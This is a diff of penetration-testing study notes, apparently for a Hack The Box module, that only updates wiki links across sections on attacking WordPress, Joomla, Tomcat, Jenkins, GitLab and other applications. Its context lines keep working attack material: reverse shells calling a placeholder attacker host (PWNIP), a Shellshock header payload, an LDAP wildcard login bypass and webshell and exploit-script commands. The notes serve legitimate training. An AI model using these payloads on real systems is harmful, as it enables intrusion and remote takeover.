@@ -20,7 +20,7 @@ cat webDiscovery.xml | aquatone -nmap
 firefox aquatone_report.html
 ```
 
-See [[Attacking Common Applications (HTB Supplementary)#ACA.1. Application Discovery (EyeWitness + Aquatone)|ACA.1]].
+See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.1]].
 
 #### Tags: #EyeWitness #Aquatone #WebDiscovery
 
@@ -64,7 +64,7 @@ cd /tmp && zip -r shell.zip shell
 # Webshell fires on every page: http://<target>/?cmd=id
 ```
 
-See [[Attacking Common Applications (HTB Supplementary)#ACA.2. WordPress. Enumeration & Attack|ACA.2]], [[Web Applications#WordPress|existing WordPress entry]].
+See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.2]], [[Web Applications#WordPress|existing WordPress entry]].
 
 #### Tags: #WordPress #WPScan #XMLRPCBruteForce #PluginLFI
 
@@ -90,7 +90,7 @@ python3 joomla-brute.py -u http://<target> -w /usr/share/wordlists/rockyou.txt -
 exec("/bin/bash -c 'bash -i >& /dev/tcp/PWNIP/PWNPO 0>&1'");
 ```
 
-See [[Attacking Common Applications (HTB Supplementary)#ACA.3. Joomla. Enumeration & Attack|ACA.3]].
+See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.3]].
 
 #### Tags: #Joomla #JoomlaBruteForce #TemplateEditorRCE
 
@@ -113,7 +113,7 @@ curl -s http://<target>/core/CHANGELOG.txt | grep -m1 "Drupal"
 # Click Save → reverse shell fires immediately
 ```
 
-See [[Attacking Common Applications (HTB Supplementary)#ACA.4. Drupal. Enumeration & Attack|ACA.4]].
+See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.4]].
 
 #### Tags: #Drupal #PHPFilter #DrupalRCE
 
@@ -154,7 +154,7 @@ set FORCEEXPLOIT true
 exploit
 ```
 
-See [[Attacking Common Applications (HTB Supplementary)#ACA.5. Tomcat. Enumeration & Attack (Manager + CGI CVE-2019-0232)|ACA.5]], [[Shells & Payloads#Tomcat WAR|Shells & Payloads appendix]].
+See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.5]], [[Shells & Payloads#Tomcat WAR|Shells & Payloads appendix]].
 
 #### Tags: #Tomcat #TomcatRCE #WARDeploy #CVE20190232 #TomcatCGI
 
@@ -173,7 +173,7 @@ p.waitFor()
 # Start nc -nvlp PWNPO first, then click Run
 ```
 
-See [[Attacking Common Applications (HTB Supplementary)#ACA.6. Jenkins. Script Console RCE|ACA.6]].
+See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.6]].
 
 #### Tags: #Jenkins #GroovyRCE #ScriptConsole
 
@@ -193,7 +193,7 @@ nc -nvlp PWNPO
 # Shell fires as NT AUTHORITY\SYSTEM (Windows) or splunk user (Linux)
 ```
 
-See [[Attacking Common Applications (HTB Supplementary)#ACA.7. Splunk. App Install RCE|ACA.7]].
+See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.7]].
 
 #### Tags: #Splunk #SplunkRCE #AppInstall
 
@@ -216,7 +216,7 @@ evil-winrm -i <target> -u prtgadm1 -p 'Pwn3d_by_PRTG!'
 type C:\Users\Administrator\Desktop\flag.txt
 ```
 
-See [[Attacking Common Applications (HTB Supplementary)#ACA.8. PRTG Network Monitor. RCE|ACA.8]].
+See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.8]].
 
 #### Tags: #PRTG #NotificationRCE #LocalAdminCreation
 
@@ -242,7 +242,7 @@ python3 49951.py -t http://gitlab.target.local:8081 \
   -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc PWNIP 9001 >/tmp/f'
 ```
 
-See [[Attacking Common Applications (HTB Supplementary)#ACA.10. GitLab. Enumeration & RCE|ACA.10]].
+See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.10]].
 
 #### Tags: #GitLab #GitLabRCE #GitLabUserEnum
 
@@ -263,7 +263,7 @@ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/PWNIP/PWNPO 0>&1' http:
 
 Payload anatomy: `() { :; };` defines a dummy bash function. Bash re-evaluates exported function definitions from environment variables, the `;` after `}` injects a second command into that re-evaluation context.
 
-See [[Attacking Common Applications (HTB Supplementary)#ACA.11. Shellshock (CGI)|ACA.11]].
+See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.11]].
 
 #### Tags: #Shellshock #CVE20146271 #CGI #BashInjection
 
@@ -280,7 +280,7 @@ searchsploit -m 50057.py
 python3 50057.py
 ```
 
-See [[Attacking Common Applications (HTB Supplementary)#ACA.13. ColdFusion. Discovery & RCE|ACA.13]], [[Arctic|Arctic box writeup]] (same ColdFusion 8 CVE).
+See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.13]], [[Arctic|Arctic box writeup]] (same ColdFusion 8 CVE).
 
 #### Tags: #ColdFusion #ColdFusionRCE #CVE20092265
 
@@ -302,7 +302,7 @@ egrep -R ^transf /usr/share/wordlists/ | sed 's/^[^:]*://' > /tmp/list.txt
 gobuster dir -u http://<target>/ -w /tmp/list.txt -x .aspx,.asp
 ```
 
-See [[Attacking Common Applications (HTB Supplementary)#ACA.14. IIS Tilde Enumeration|ACA.14]].
+See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.14]].
 
 #### Tags: #IISTildeEnumeration #IIS #ShortNameScanner
 
@@ -317,7 +317,7 @@ Password: *
 # LDAP filter becomes: (&(uid=*)(password=*)) → matches first user → login succeeds
 ```
 
-See [[Attacking Common Applications (HTB Supplementary)#ACA.15. LDAP Authentication Bypass|ACA.15]].
+See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.15]].
 
 #### Tags: #LDAP #LDAPBypass #WildcardAuth
 
@@ -334,7 +334,7 @@ scp root@<target>:/opt/asset-manager/app.py .   # or SSH + cat
 curl -X POST http://<target>/login -d 'username=test&password=test&active=1'
 ```
 
-See [[Attacking Common Applications (HTB Supplementary)#ACA.16. Web Mass Assignment|ACA.16]].
+See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.16]].
 
 #### Tags: #MassAssignment #ParameterPollution
 
@@ -353,7 +353,7 @@ run                       # pause at breakpoint
 # "DRIVER=...;SERVER=...;UID=SA;PWD=N0tS3cr3t!;"
 ```
 
-See [[Attacking Common Applications (HTB Supplementary)#ACA.17. Applications Connecting to Services, gdb ODBC|ACA.17]].
+See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.17]].
 
 #### Tags: #GDB #ODBCCredentials #BinaryAnalysis
 
@@ -373,7 +373,7 @@ See [[Attacking Common Applications (HTB Supplementary)#ACA.17. Applications Con
 # Dump Memory to File → drag onto de4dot → drag cleaned .bin onto dnSpy
 ```
 
-See [[Attacking Common Applications (HTB Supplementary)#ACA.12. Thick Client Applications|ACA.12]].
+See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.12]].
 
 #### Tags: #ThickClient #dnSpy #de4dot #DotNET #HardcodedCredentials
 
@@ -393,7 +393,7 @@ set LHOST PWNIP
 exploit
 ```
 
-See [[Attacking Common Applications (HTB Supplementary)#ACA.18. Other Notable Applications. WebLogic|ACA.18]].
+See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.18]].
 
 #### Tags: #WebLogic #OracleWebLogic #MSFExploit
 
@@ -411,7 +411,7 @@ python3 49422.py http://<target> <user> '<pass>' PWNIP PWNPO &
 # Shell as www-data → cat flag.txt
 ```
 
-See [[Attacking Common Applications (HTB Supplementary)#ACA.20. Skills Assessment II|ACA.20]].
+See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.20]].
 
 #### Tags: #NagiosXI #NagiosRCE #MonitoringRCE
 
@@ -494,7 +494,7 @@ If the DNN installation is on a volume shared via NFS (check with `showmount -e 
 /SHARE/DNN/web.config → <username>Administrator</username> + <value>PASSWORD</value>
 ```
 
-See [[Attacking Enterprise Networks (HTB Supplementary)#AEN.7|AEN.7]] for the full chain example.
+See [[27. Assembling the Pieces|AEN.7]] for the full chain example.
 
 #### Tags: #DNN #DotNetNuke #CMS #xpCmdshell #PrintSpoofer #SeImpersonatePrivilege #SAMDump #IIS #HTBSupplementary
 
